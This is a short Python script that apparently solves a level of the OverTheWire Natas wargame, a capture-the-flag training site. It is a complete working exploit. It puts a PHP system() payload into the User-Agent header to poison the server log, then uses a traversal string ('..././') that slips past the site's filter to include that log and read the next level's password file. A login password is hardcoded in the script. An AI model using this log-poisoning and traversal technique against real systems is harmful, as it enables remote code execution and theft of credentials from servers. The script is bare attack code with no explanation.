import requests
import re

username = "natas25"
password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"

url = "http://%s.natas.labs.overthewire.org/" %username

header = {"User-Agent":"<?php system('cat /etc/natas_webpass/natas26'); ?>"}
session = requests.Session()
response = session.get(url,auth=(username,password))

response = session.post(url,headers = header,data = {"lang":"..././..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+session.cookies['PHPSESSID']+".log"},auth=(username,password))


print(response.text)

